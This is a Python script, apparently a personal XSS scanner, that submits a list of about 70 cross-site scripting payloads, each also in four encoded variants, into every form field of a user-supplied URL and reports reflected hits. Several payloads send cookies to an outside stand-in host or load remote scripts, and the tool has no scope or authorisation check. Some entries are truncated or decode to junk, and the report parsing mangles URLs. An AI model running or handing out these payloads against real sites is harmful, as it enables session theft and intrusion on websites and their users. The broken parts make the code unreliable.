import requests
import base64
import datetime
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os

os.system("clear")

print('''
    \033[91m 
     █████╗ ███╗   ██╗ █████╗ ███████╗    ██╗  ██╗███████╗███████╗
    ██╔══██╗████╗  ██║██╔══██╗██╔════╝    ╚██╗██╔╝██╔════╝██╔════╝
    ███████║██╔██╗ ██║███████║███████╗     ╚███╔╝ ███████╗███████╗
    ██╔══██║██║╚██╗██║██╔══██║╚════██║     ██╔██╗ ╚════██║╚════██║
    ██║  ██║██║ ╚████║██║  ██║███████║    ██╔╝ ██╗███████║███████║
    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚══════╝
    \033[0m
                                                              
''')


# Headers
headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}

# Base Payloads
base_payloads = [
    "<script>alert('XSS')</script>", 
    "<IMG SRC=javascript:alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>", 
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<svg><img src='x' onerror=alert(1)//'>",
    "<body onload=alert(1)>",
    "<img src='javascript:alert(1)'>",
    "<input autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<form onsubmit=alert(1)>",
    "<a href='javascript:alert(1)'>Click Me</a>",
    "<script>eval('alert(1)')</script>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<script>eval(String.fromCharCode(88,83,83))</script>",
    "<script>alert('XSS1');</script>",
    "<script>alert('XSS2');</script>",
    "<script>alert('XSS3');</script>",
    "<img src='http://example.com/xss' onerror='alert(1)'>",
    "<a href='javascript:eval(atob(",
    "<img src=//example.com/xss onerror=alert(1)>",
    "<script>location='http://example.com?cookie='+document.cookie</script>",
    "<script src='http://example.com/xss.js'></script>",
    "<script>document.location='http://example.com?cookie='+document.cookie</script>",
    "<input type='text' value=''><script>alert(document.cookie)</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<img src='http://example.com/xss?cookie=' onerror=alert(document.cookie)>",
    "<img src='http://example.com/xss?cookie='+document.cookie onerror=alert(1)>",
    "<a href='http://example.com?cookie='+document.cookie>Click Me</a>",
    "<img src='x' onerror='document.location='javascript:alert(1)''>",
    "<svg/onload=alert(1)>",
    "<div onclick='alert(1)'>Click Me</div>",
    "<input type='text' value=''><script>alert(document.location)</script>",
    "<form action='javascript:alert(1)'>Submit</form>",
    "<a href='javascript:eval(atob('YWxlcnQoMSk=') )>XSS</a>",
    "<a href='javascript:alert(1)'>XSS</a>",
    "<input autofocus onfocus=alert(1)>",
    "<input onfocus=alert(1)>",
    "<textarea onfocus=alert(1)>Text</textarea>",
    "<button onClick=alert(1)>Click Me</button>",
    "<div onmouseover=alert(1)>Hover over me</div>",
    "<a href='javascript:eval(String.fromCharCode(88,83,83))'>Link</a>",
    "<script>eval(String.fromCharCode(88,83,83))</script>",
    "<img src='x' onerror=eval('alert(1)')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<img src='data:image/svg+xml;base64,'><svg/onload=alert(1)>",
    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' type='text/html'></object>",
    "<img src=x onerror=eval('alert(1)')>",
    "<img src='http://example.com?cookie='+document.cookie onerror=alert(1)>",
    "<div onmouseover=eval('alert(1)')>Hover</div>",
    "<body onload=eval('alert(1)')>",
    "<a href='javascript:eval(String.fromCharCode(88,83,83))'>Click</a>",
    "<input type='button' value='XSS' onClick='alert(1)'>",
    "<object data='data:text/html,<script>alert(1)</script>'></object>",
    "<form action='javascript:alert(1)'>Submit</form>",
    "<input value='<script>alert(1)</script>'>",
    "<img src='//example.com/xss' onerror='eval(1)'>",
    "<svg><img src=x onerror=alert(1)>",
    "<input type='button' value='Click' onClick='alert(1)'>",
    "<iframe src='http://example.com/xss' width=0 height=0></iframe>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<script>eval(String.fromCharCode(72,65,88))</script>",
    "<script src='data:text/javascript;base64,aWZybWUoXywwLCctYTdcXnJlY29nbmluYXMpe30='></script>",
    "<input type='text' value='' autofocus onfocus='alert(1)'>",
    "<script>document.body.innerHTML = '<h1>' + document.cookie + '</h1>'</script>",
    "<iframe src='javascript:alert(1)' style='display:none'></iframe>",
    "<img src='//example.com/xss' onerror='alert(1)'>",
    "<form action='https://example.com/?cookie='+document.cookie method=post>Submit</form>"
]

# Obfuscation functions
def obfuscate_payload(p):
    html = ''.join(f"&#{ord(c)};" for c in p)
    hex_ = ''.join(f"\\x{ord(c):02x}" for c in p)
    b64 = f"<script>eval(atob('{base64.b64encode(p.encode()).decode()}'))</script>"
    uni = ''.join(f"\\u{ord(c):04x}" for c in p)
    return [p, html, hex_, b64, uni]

# Collect all payloads including obfuscated ones
all_payloads = []
for p in base_payloads:
    all_payloads.extend(obfuscate_payload(p))

# Function to test forms for XSS vulnerabilities
def test_forms(url):
    try:
        soup = BeautifulSoup(requests.get(url, headers=headers).text, "html.parser")
        forms = soup.find_all("form")
        results = []

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            full_url = urljoin(url, action)
            inputs = form.find_all("input")
            names = [i.get("name") for i in inputs if i.get("name")]

            for payload in all_payloads:
                data = {n: payload for n in names}
                if method == "post":
                    r = requests.post(full_url, data=data, headers=headers)
                else:
                    r = requests.get(full_url, params=data, headers=headers)
                if payload in r.text:
                    encoded = base64.b64encode(url.encode()).decode()
                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    results.append(f"[☠️] VULNERABLE: {url}\n ↳ Payload: {payload}\n ↳ Base64: {encoded}\n ↳ Time: {timestamp}\n")
                    break
            print(f"🔍 Testing {url} with payload {payload}")  # Printing testing status in terminal
        return results
    except Exception as e:
        return [f"[-] ERROR: {url} | {e}"]

# Generate HTML report with CSS
def generate_html_report(results, filename="xss_report.html"):
    report = "<html><head><title>XSS Vulnerability Scan Report By Anass Labrini</title><style>"
    report += """
    body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; }
    h1 { color: #333; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { padding: 10px; border: 1px solid #ccc; text-align: left; }
    th { background-color: #4CAF50; color: white; }
    tr:nth-child(even) { background-color: #f2f2f2; }
    tr:hover { background-color: #ddd; }
    </style></head><body>"""
    report += "<h1>XSS Vulnerability Scan Report</h1>"
    report += "<table><tr><th>Target URL</th><th>Payload</th><th>Base64 URL</th><th>Timestamp</th></tr>"

    for res in results:
        if "VULNERABLE" in res:
            lines = res.split("\n")
            report += "<tr>"
            report += f"<td>{lines[0].split(':')[1].strip()}</td>"
            report += f"<td>{lines[1].split(':')[1].strip()}</td>"
            report += f"<td>{lines[2].split(':')[1].strip()}</td>"
            report += f"<td>{lines[3].split(':')[1].strip()}</td>"
            report += "</tr>"

    report += "</table></body></html>"

    with open(filename, "w") as file:
        file.write(report)

# Get the target URL from user input
target = input(" Enter target URL (e.g. https://example.com/search.php): ")

# Scan the URL for vulnerabilities
scan_results = test_forms(target)

# Save results to text file and HTML report
with open("anas_xss.txt", "w") as f:
    f.write("\n".join(scan_results))

# Generate HTML report
generate_html_report(scan_results)

print("[*] Results saved to anas_xss.txt and xss_report.html")
